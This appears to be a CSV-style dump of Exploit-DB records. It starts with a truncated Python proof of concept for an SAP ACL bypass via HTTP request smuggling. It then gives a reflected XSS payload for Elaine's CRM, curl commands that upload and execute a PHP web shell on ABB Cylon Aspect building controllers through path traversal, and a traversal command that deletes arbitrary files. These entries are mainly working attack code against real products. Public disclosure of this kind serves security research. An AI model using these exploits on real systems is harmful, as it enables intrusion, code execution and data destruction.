""/sap/public/bc/sec/saml2"", ""/sap/public/bc/webdav"" print(f""{Style.BRIGHT}{Fore.RED}[!] {Fore.WHITE}Proof of Concept for ACL Bypass via HTTP Request Smuggling{Style.RESET_ALL}\n"") for path in test_paths: try: conn_class = http.client.HTTPSConnection if is_https else http.client.HTTPConnection conn = conn_class(host, port) conn.request(""GET"", path) res_direct = conn.getresponse() content_direct = res_direct.read().decode(errors=""ignore"") direct_status = res_direct.status except Exception as e: print(f""{Fore.RED}[!] {Fore.WHITE}Error checking direct access for {path}: {e}"") continue body = build_smuggled_request(path) headers = { ""Host"": f""{host}:{port}"", ""Authorization"": ""Basic YTph"", ""Cookie"": ""saplb_*=(J2EE7364720)7364750"", ""Content-Type"": ""application/json"", ""Content-Length"": str(len(body.encode(""utf-8""))) try: conn = conn_class(host, port) conn.request(""POST"", ""/sap/admin/public/default.html"", body=body, headers=headers) res = conn.getresponse() smuggled_headers = res.getheaders() content_smuggled = res.read().decode(errors=""ignore"") smuggled_status = res.status status_color = Fore.GREEN if smuggled_status != direct_status else Fore.RED print(f""{status_color}[-] {Fore.LIGHTBLUE_EX}{path} {Style.BRIGHT}{Fore.WHITE}Direct Access: {Fore.YELLOW}({direct_status}) {Fore.WHITE}Smuggled Access: {status_color}({smuggled_status}){Style.RESET_ALL}"") if smuggled_status == direct_status: print(f""{Fore.RED}[x] {Fore.WHITE}Exploit did not work for {path}\n"") with open("""
CVE-2024-42831,2025-04-02,exploit db,"# Exploit Title: Elaine's Realtime CRM Automation 6.18.17 - Reflected XSS # Date: 09/2024 # Exploit Author: Haythem Arfaoui (CBTW Team) # Vendor Homepage: https://www.elaine.io/ # Software Link: https://www.elaine.io/en/products/elaine-marketing-automation/ # Version: 6.18.17 and below # Tested on: Windows, Linux # CVE : CVE-2024-42831 # Description A reflected cross-site scripting (XSS) vulnerability in Elaine's Realtime CRM Automation v6.18.17 allows attackers to execute arbitrary JavaScript code in the web browser of a user via injecting a crafted payload into the dialog parameter at wrapper_dialog.php. # Steps to reproduce: 1. Navigate to any website that contains Elaine's Realtime CRM Automation 2. Navigate to this endpoint: /system/interface/wrapper_dialog.php 3. Append the payload *a""%20onafterscriptexecute=alert(document.domain)> *in the *""dialog*"" param and execute the request 4. Final URL : /system/interface/wrapper_dialog.php?dialog=a""%20onafterscriptexecute=alert(document.domain)>"
CVE-2024-6298,2025-04-02,exploit db,"# Exploit Title : ABB Cylon Aspect 3.08.01 - Remote Code Execution (RCE) Vendor: ABB Ltd. Product web page: https://www.global.abb Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.01 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB BMS/BAS controller suffers from a remote code execution vulnerability. The vulnerable uploadFile() function in bigUpload.php improperly reads raw POST data using the php://input wrapper without sufficient validation. This data is passed to the fwrite() function, allowing arbitrary file writes. Combined with an improper sanitization of file paths, this leads to directory traversal, allowing an attacker to upload malicious files to arbitrary locations. Once a malicious file is written to an executable directory, an authenticated attacker can trigger the file to execute code and gain unauthorized access to the building controller. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x86_64) GNU/Linux 2.6.32 (x86_64) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Advisory ID: ZSL-2024-5828 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5828.php CVE ID: CVE-2024-6298 CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2024-6298 21.04.2024 $ cat project P R O J E C T 1. $ curl -X POST ""http://192.168.73.31/bigUpload.php?action=upload&key=251"" \ > -H ""Cookie: PHPSESSID=25131337"" \ > -H ""Content-Type: application/x-www-form-urlencoded"" \ > -d "" "" 2. $ curl -X POST ""http://192.168.73.31/bigUpload.php?action=upload&key=251"" \ > -H ""Cookie: PHPSESSID=25131337"" \ > –H ""Content-Type: application/x-www-form-urlencoded"" 3. $ curl -X POST ""http://192.168.73.31/bigUpload.php?action=finish"" \ > -H ""Cookie: PHPSESSID=25131337"" \ > -H ""Content-Type: application/x-www-form-urlencoded"" \ > -d ""key=251&name=../../../../../../../home/MIX_CMIX/htmlroot/ZSL.php"" 4. $ curl http://192.168.73.31/ZSL.php?j=id uid=33(www-data) gid=33(www-data) groups=33(www-data)"
CVE-2024-6209,2025-04-02,exploit db,"# Exploit Title : ABB Cylon Aspect 3.08.01 - Arbitrary File Delete Vendor: ABB Ltd. Product web page: https://www.global.abb Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.01 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The BMS/BAS controller suffers from an arbitrary file deletion vulnerability. Input passed to the 'file' parameter in 'databasefiledelete.php' is not properly sanitised before being used to delete files. This can be exploited by an unauthenticated attacker to delete files with the permissions of the web server using directory traversal sequences passed within the affected POST parameter. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x86_64) GNU/Linux 2.6.32 (x86_64) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Advisory ID: ZSL-2024-5827 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5827.php CVE ID: CVE-2024-6209 CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2024-6209 21.04.2024 $ cat project P R O J E C T $ curl -X POST http://192.168.73.31/databaseFileDelete.php \ > -d ""file0=../../../../../../../../../home/MIX_CMIX/htmlroot/validate/validateHeader.php \ > &delete0=1 \ > &total=1 \ > &submitDeleteForm=Delete"""
